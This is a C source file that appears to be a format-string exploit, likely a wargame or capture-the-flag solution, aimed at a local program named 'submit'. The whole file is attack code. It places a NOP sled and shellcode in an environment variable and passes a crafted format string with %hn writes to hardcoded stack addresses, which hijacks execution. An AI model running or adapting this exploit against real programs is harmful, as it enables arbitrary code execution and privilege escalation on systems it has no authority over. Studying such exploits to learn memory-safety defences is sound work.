#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define NOP 0x90
#define SIZE 512
#define FS "\x1c\xdc\xbf\xff\x1e\xdc\xbf\xff%56789x%112$hn%08674x%113$hn"

int main(int argc, char** argv){
	char *args[4], *ptr, *envs[2];
	char *fs = FS;
	char buf[SIZE];
	const int slen = strlen(shellcode);

	memset(buf, NOP, SIZE);
	ptr = buf + 128;
	memcpy(ptr, shellcode, slen);

	
	args[0] = "submit";
	args[1] = fs;
	args[2] = "message";
	args[3] = NULL;

	envs[0] = buf;
	envs[1] = NULL;
 
	if(execve("/usr/local/bin/submit", args, envs) < 0){
		printf("execve error\n");
	}
	return 0;

}